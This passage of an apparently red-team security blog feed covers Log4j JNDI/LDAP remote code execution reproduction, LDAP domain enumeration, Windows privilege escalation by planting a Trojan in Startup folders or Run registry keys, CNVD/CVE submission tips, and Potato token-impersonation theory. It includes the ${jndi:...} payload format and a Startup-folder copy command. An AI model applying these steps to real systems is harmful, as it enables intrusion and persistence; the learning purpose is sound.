title="dnslog回显"></a>dnslog回显</h3><pre class="line-numbers language-none"><code class="language-none">随便新建个项目，放入log4j的两个jar包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215115505461.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">pom<span class="token punctuation">.</span>xml需要修改如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215120024410.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">手写一个测试类，dnslog回显如下，检测确认可以拿来打<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215115825719.png"></p><pre class="line-numbers language-none"><code class="language-none">LogManager.getLogger()调用中仅error、fatal可触发漏洞，其他方法需要配置日志级别才能够触发漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215143922240.png"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">进步加载本地类<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215135120748.png"></p><pre class="line-numbers language-none"><code class="language-none">启个web服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215134221804.png"></p><pre class="line-numbers language-none"><code class="language-none">起个ldap服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215142753646.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">通过本地加载恶意类，弹窗如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215142543781.png"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><pre class="line-numbers language-none"><code class="language-none">复现环境需要注意，最好是191以下版本的，因为高版本的jdk没法远程加载类了解决方案如下高版本远程加载可设置，效果同上图mac本地idea中的命令执行System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215143008435.png"></p><pre class="line-numbers language-none"><code class="language-none">通过对官网给出的信息分析后，可得漏洞主要是通过jndi中的ldap的方式进行rce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215151602575.png"></p><pre class="line-numbers language-none"><code class="language-none">补丁记录以及对lookup函数进行了判断<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215152801202.png"></p><pre class="line-numbers language-none"><code class="language-none">进步查看lookup的说明提供了一种在任意位置向Log4j配置添加值的方法。它们是实现StrLookup接口的特殊类型的插件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215152906527.png"></p><pre class="line-numbers language-none"><code class="language-none">支持的方法如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215153108454.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">这里主要以jndi进行展<span class="token class-name">JndiLookup</span>允许通过JNDI检索变量<span class="token operator">&lt;</span><span class="token class-name">File</span> name<span class="token operator">=</span><span class="token string">"Application"</span> fileName<span class="token operator">=</span><span class="token string">"application.log"</span><span class="token operator">></span>  <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PatternLayout</span><span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>pattern<span class="token punctuation">></span></span><span class="token operator">%</span>d <span class="token operator">%</span>p <span class="token operator">%</span>c<span class="token punctuation">&#123;</span><span class="token number">1.</span><span class="token punctuation">&#125;</span> <span class="token punctuation">[</span><span class="token operator">%</span>t<span class="token punctuation">]</span> $$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>logging<span class="token operator">/</span>context<span class="token operator">-</span>name<span class="token punctuation">&#125;</span> <span class="token operator">%</span>m<span class="token operator">%</span>n<span class="token operator">&lt;</span><span class="token operator">/</span>pattern<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token class-name">PatternLayout</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token class-name">File</span><span class="token operator">></span>  基本利用格式$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>jndicontext<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215153202958.png"></p><pre class="line-numbers language-none"><code class="language-none">到现在能够知道的就是lookup是主要的触发点，通过找到触发lookup的触发方法为入口，传入jndi调用ldap进步rce那么个入口点能够利用jndi调用ldaprce?使用的就是LogManager.getLogger()的方法，不过默认仅error、fatal能够利用成功，因为对日志等级进行了一次判断，只要当当前的事件日志等级大于设定的日志等级时候才会符合条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Log4j </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程实现LDAP基本信息收集</title>
      <link href="2021/11/16/shi-xian-ldap-xin-xi-shou-ji/"/>
      <url>2021/11/16/shi-xian-ldap-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">目前实现LDAP信息收集的工具有很多，相关语法结构成熟资料也非常多，在不断的思考下回顾先前学习，总是觉得没从原理深入一遍就只是个会用工具的脚本小子，此处以编程语言封装实现LDAP相关查询功能理解相关连接、查询功能模块，内置部分过滤规则，后续将进步进行迭代增加各项过滤规则主要目标，当严苛环境下，相关已知工具被杀软查杀情况下，能够通过自写查询工具从而实现基本敏感信息收集基本实现流程：连接目标ldap服务器-用户给予的账户密码进行认证-执行ldap语句查询-获取相关属性名从而取得目标数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/LDAPquery/image-20211116174845219.png"></p><h3 id="查询域用户信息"><a href="#查询域用户信息" class="headerlink" title="查询域用户信息"></a>查询域用户信息</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/LDAPquery/image-20211116174354613.png"></p><h3 id="查询域机器信息"><a href="#查询域机器信息" class="headerlink" title="查询域机器信息"></a>查询域机器信息</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/LDAPquery/image-20211116174456877.png"></p><h3 id="查询非约束委派机器信息"><a href="#查询非约束委派机器信息" class="headerlink" title="查询非约束委派机器信息"></a>查询非约束委派机器信息</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/LDAPquery/image-20211116174538717.png"></p><h3 id="查询约束委派机器信息"><a href="#查询约束委派机器信息" class="headerlink" title="查询约束委派机器信息"></a>查询约束委派机器信息</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/LDAPquery/image-20211116174607440.png"></p><h3 id="自定义条件语句"><a href="#自定义条件语句" class="headerlink" title="自定义条件语句"></a>自定义条件语句</h3><pre class="line-numbers language-none"><code class="language-none">功能暂未完善，相关返回结果暂不支持自定义，待后续进步深入开发<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/LDAPquery/image-20211116174718197.png"></p><h3 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h3><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Domain Environment </tag>
            
            <tag> LDAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Boot Logon Autostart Execution Windows Privilege Promotion</title>
      <link href="2021/11/14/boot-logon-autostart-execution-windows-privilege-promotion/"/>
      <url>2021/11/14/boot-logon-autostart-execution-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Through the start folder to modify, so as to achieve the relevant user rightsThe Startup folder is a folder accessible from the Start menu, and once the target user logs in to his machine, the applications saved in the folder will launch directlyAll user paths:C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUpCurrent user path:C:\Users\yangsir\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Environment-configuration"><a href="#Environment-configuration" class="headerlink" title="Environment configuration"></a>Environment configuration</h3><pre class="line-numbers language-none"><code class="language-none">Enter the target path as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114151655800.png"></p><pre class="line-numbers language-none"><code class="language-none">Edit permissions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114151721287.png"></p><pre class="line-numbers language-none"><code class="language-none">Give full control<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114151810438.png"></p><h2 id="icacls"><a href="#icacls" class="headerlink" title="icacls"></a>icacls</h2><pre class="line-numbers language-none"><code class="language-none">The test results are as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114152918882.png"></p><h3 id="Simple-to-use"><a href="#Simple-to-use" class="headerlink" title="Simple to use"></a>Simple to use</h3><pre class="line-numbers language-z" data-language="z"><code class="language-z">Add read and write permissions to progress writing to our Trojan path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114153117952.png"></p><pre class="line-numbers language-none"><code class="language-none">Copy the file to the startup directoryshell copy C:\Users\sqladmin\Desktop\b.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114153344894.png"></p><pre class="line-numbers language-none"><code class="language-none">After confirming the login account of a user with high permission, the user directly obtains related permissions as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Boot%20Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114153522857.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Logon Autostart Execution Windows Privilege Promotion</title>
      <link href="2021/11/14/logon-autostart-execution-windows-privilege-promotion/"/>
      <url>2021/11/14/logon-autostart-execution-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Through the login user&#39;s self-start file modification, so as to achieve permission promotionAbout the run&amp;Runonce registry contentsThe Run and RunOnce registry keys cause the program to Run each time the user logs inThe Run registry key will Run the task on each login, the RunOnce registry key will Run the task once and then delete the entry, and RunOnce will automatically delete the entry upon successful executionThe four different positions available are as followsHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Environment-configuration"><a href="#Environment-configuration" class="headerlink" title="Environment configuration"></a>Environment configuration</h3><pre class="line-numbers language-none"><code class="language-none">Create a new folder as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114154112964.png"></p><pre class="line-numbers language-none"><code class="language-none">Give authenticated users full control as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114154252868.png"></p><pre class="line-numbers language-none"><code class="language-none">Enter the registry and write the relevant function path as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114154428396.png"></p><h3 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h3><pre class="line-numbers language-none"><code class="language-none">Easy to use, if you can&#39;t not know how to use, you can follow my history blog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114155243521.png"></p><h4 id="Simple-to-use"><a href="#Simple-to-use" class="headerlink" title="Simple to use"></a>Simple to use</h4><pre class="line-numbers language-none"><code class="language-none">Upload the Trojan file to the destination path and rename it to the path information in the registry<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114155528695.png"></p><pre class="line-numbers language-none"><code class="language-none">After the target machine is restarted, users with high permissions are granted the following permissions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Logon%20Autostart%20Execution%20Windows%20Privilege%20Promotion/image-20211114155810935.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人CNVD证书&amp;CVE编号获取之道</title>
      <link href="2021/11/13/ge-ren-cnvd-zheng-shu-cve-bian-hao-huo-qu-zhi-dao/"/>
      <url>2021/11/13/ge-ren-cnvd-zheng-shu-cve-bian-hao-huo-qu-zhi-dao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">时间也过去了很久了，最近说起些如何获得的思路？仅以此文做个思路发散，希望能够帮助到每个梦想路上的人1、如果你静不下心做一件事，那么你可以划走了，因为你必然挖不到洞2、如果你觉得CNVD证书、CVE编号没用，那么你可以划走了，毕竟很大的一部分人自己没得却说别人的没用3、如果是想来看漏洞细节的，那么你可以划走了，文章不放漏洞细节文章带给你的不是教你如何rce，而是rce完了后的一些关注点，另外早期挖的都是web类型漏洞，所以我获得的证书&amp;编号都是以web应用漏洞交的另外平凡人，踏踏实实做好每件事，提高专注度，专注于你的方向，人家一天一个rce，专注度做不到，那就一个月一个rce，难道不也是一种成功嘛？每个人的想法不同我也不去强加改变，留给现实去论证就好，文章仅提供早期过程中的一些思路，纪念过往的心路历程，cnvd、cve部分记录截图如下，数量其实也不多，CNVD证书+CVE编号加起来也没过百....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c1.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c2.png"></p><h2 id="CNVD证书"><a href="#CNVD证书" class="headerlink" title="CNVD证书"></a>CNVD证书</h2><pre class="line-numbers language-none"><code class="language-none">简单看下规则，找了下官网的，当然也许会有更新的规则，因为现在也不挖这些的，凑合看看，大致东西是一样的：对于中危及中危以上通用型漏洞（CVSS2.0基准评分超过4.0分），以及涉及党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞(后续对事件型漏洞证明颁发标准将参考中央网信办颁布的关键基础设施相关定义和分类)，CNVD将给予原创漏洞证明（即CNVD漏洞证书，电子版），该证明可通过编号在CNVD官方网站进行查询跟踪cnvd收录的漏洞分为通用型、事件型两种，此处根据已有经验，想拿证书很容易，我没通过事件型拿过证书我也不会也不用问我，所以重点关注三种方式：1、通过基本的源码审计，能够获得web漏洞且攻击利用成功的2、通过基本的漏洞挖掘，凑满10个案例的3、通过基本的漏洞挖掘，某些重点目标的（自行领会），亲测仅一个案例即可漏洞目标，建议多关注rce这类的中高危漏洞，毕竟低危或许有，但是评分不够，也拿不到证书的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><pre class="line-numbers language-none"><code class="language-none">需要基本能够进行简单的源码审计，毕竟下个源码就可以开始了，也像第二种还得凑案例，此处我也是曾经学习过程中，边学习边进行审计，后来发现方向和自己追求不太相符，于是乎果断放弃这个方向<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><pre class="line-numbers language-none"><code class="language-none">如果你有基本的信息收集思路，那么你找满10个案例一定非常容易，如果你不会，建议先去学习如何进行信息收集<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><pre class="line-numbers language-none"><code class="language-none">自行领会，只可意会不可言传<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="编写报告"><a href="#编写报告" class="headerlink" title="编写报告"></a>编写报告</h3><pre class="line-numbers language-none"><code class="language-none">如果你是利用的第一种情况交报告，那么务必写清楚审计过程、攻击过程、相关exp代码等如果你是利用的第二、三种情况交报告的，那么务必写清楚每个，注意是每个的攻击过程，相关exp代码等然后再根据实际情况提交报告即可，相对于你挖到洞来比，这点基本没什么难度的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="随便放了个证书"><a href="#随便放了个证书" class="headerlink" title="随便放了个证书"></a>随便放了个证书</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c3.png"></p><h2 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;cveform.mitre.org&#x2F;  申请地址，基本一些提交重点看下图就行了，挖到洞一定比你交洞难度大，相信你一定没问题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c4.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c5.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c6.png"></p><pre class="line-numbers language-none"><code class="language-none">耐心等待即可，然后你就能在先前填写的邮箱内获得cve的回复了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cnvd-cve/c7.png"></p>]]></content>
      
      
      <categories>
          
          <category> Actual combat record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNVD </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>土豆提权原理分析</title>
      <link href="2021/11/12/tu-dou-ti-quan-yuan-li-fen-xi/"/>
      <url>2021/11/12/tu-dou-ti-quan-yuan-li-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">土豆系列的提权原理主要是诱导高权限访问低权限的系统对象，导致低权限的对象可以模拟高权限对象的访问令牌（Access Token），进而可以用访问令牌创建进程，达到代码执行。访问控制模型有两个主要的组成部分，访问令牌（Access Token）和安全描述符（Security Descriptor），它们分别是访问者和被访问者拥有的东西。通过访问令牌和安全描述符的内容，Windows可以确定持有令牌的访问者能否访问持有安全描述符的对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于令牌"><a href="#关于令牌" class="headerlink" title="关于令牌"></a>关于令牌</h3><h4 id="令牌模拟"><a href="#令牌模拟" class="headerlink" title="令牌模拟"></a>令牌模拟</h4><pre class="line-numbers language-none"><code class="language-none">windows token又叫access token，是一个描述进程或者线程安全上下文的一个对象，不同的用户登录计算机后，都会生成一个access token，这个toekn在用户创建进程或者线程时候就会被不断拷贝，也就解释了A用户创建一个进程而该进程不会有B用户的权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><pre class="line-numbers language-none"><code class="language-none">主要分为：主令牌primary令牌、模拟令牌impersonation令牌当用户注销后，系统将会使主令牌切换为模拟令牌，而模拟令牌不会被清除只有重启机器后才会被清除每个进程都有一个主令牌，用于描述与进程关联的用户帐户的安全上下文。当进程的线程与安全对象交互时，系统将使用主令牌。线程可以模拟客户端帐户。模拟允许线程使用客户端的安全上下文与安全对象进行交互。模拟客户端的线程同时具有主令牌和模拟令牌令牌的组成：用户帐户 ( SID) 安全标识符用户是其中一个成员的组的 ID标识 当前登录 会话的 登录 SID用户 或 用户组拥有的权限列表所有者 SID主组的 SID用户创建安全对象而不指定安全描述符时系统 使用的默认 DACL访问令牌的源令牌是主 令牌还是模拟令牌限制 SID 的可选列表当前模拟级别其他统计信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h4><pre class="line-numbers language-none"><code class="language-none">使用凭据进行认证–&gt;登录Session创建–&gt;Windows返回用户sid和用户组sid–&gt;LSA(Local Security Authority)创建一个Token–&gt;依据该token创建进程、线程(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就继承父进程Token进行运行)模拟等级SecurityAnonymous服务器无法模拟或标识客户端SecurityIdentification服务器可以获取客户端的标识和特权，但不能模拟客户端SecurityImpersonation服务器可以模拟本地系统上的客户端安全上下文SecurityDelegation服务器可以在远程系统上模拟客户端的安全上下文<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211110132445545.png" alt="image-20211110132445545"></p><pre class="line-numbers language-none"><code class="language-none">常规通过用户身份创建进程的函数CreateProcessWithLogon不需要特权域&#x2F;用户名&#x2F;密码CreateProcessWithToken需要SeImpersonatePrivilegePrimary令牌CreateProcessAsUser需要SeAssignPrimaryTokenPrivilege和SeIncreaseQuotaPrivilegePrimary令牌当拥有了SeAssignPrimaryTokenPrivilege、SeImpersonatePrivilege就能够以primary令牌方式来创建新的进程从而提升权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常规土豆提权漏洞"><a href="#常规土豆提权漏洞" class="headerlink" title="常规土豆提权漏洞"></a>常规土豆提权漏洞</h3><pre class="line-numbers language-none"><code class="language-none">烂土豆(Rotten Potato)提权MS16-075CVE-2020-0668CVE-2020-0683 MSI Packages Symbolic Links Processing - Windows 10 Privilege EscalationCVE-2020-8950CVE-2020-0683CVE-2019-1002101CVE-2019-0986CVE-2018-1088<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><pre class="line-numbers language-none"><code class="language-none">该提权手法前提是拥有SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege权限，以下用户拥有SeImpersonatePrivilege权限，而只有更高的用户如system才拥有SeAssignPrimaryTokenPrivilege权限：本地管理员账户（不包含管理组普通用户）和本地服务账户由SCM启动的服务也可以理解拥有SeImpersonatePrivilege、SeAssignPrimaryTokenPrivilege也就是system权限注意，及时本地组策略授予管理员组普通用户SeImpersonatePrivilege权限，在whoami &#x2F;priv内也无法显示该特权，且无法利用，SeAssignPrimaryTokenPrivilege权限可以正常授予普通用户windows服务账户：Local System   NT AUTHORITY\SYSTEMNetwork Service  NT AUTHORITY\Network ServiceLocal Service  NT AUTHORITY\Local Service即，提权是administrator-&gt;system  service-&gt;system实际使用场景在于iiswebshell、sqlshell的情况下获取到的是服务账户，其实是个低权限账户，那么用该手法就可以提到system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HotPotato"><a href="#HotPotato" class="headerlink" title="HotPotato"></a>HotPotato</h2><h3 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h3><pre class="line-numbers language-none"><code class="language-none">基于NTLM反射的权限的攻击方式，可以从主机最低用户权限提升至system，其中将利用ntlm relay(http-&gt;smb)和nbns欺骗，获取windows最高权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4><pre class="line-numbers language-none"><code class="language-none">net bios name service 是windows中使用的udp广播服务，使用udp进行实现，可以通过发送局域网内广播来实现本地名称解析类似于dns，负责查找目标机器对应的ip，并赋予一个netbios服务，微软的wins服务采用的就是nbns服务，实现欺骗是会向所有主机广播一条信息，谁是XXX，如果谁回应了这个消息票，谁就是XXX，内网渗透下攻击者往往将监听nbns广播信息，并会应答自己是XXX，这就是nbns欺骗，nbns包有1个2字节的txid字段，必须进行请求与响应，因为是提权漏洞，攻击前没有权限可以监听流量，但可以通过1——65535进行泛红猜解另外如果网络中有dns协议，那么久不会使用nbns，可以通过udp端口耗尽从而实现dns查询失败，这么一来就必须使用nbns补充系统进行一个名字查询的逻辑如下1、查询本地hosts文件2、dns 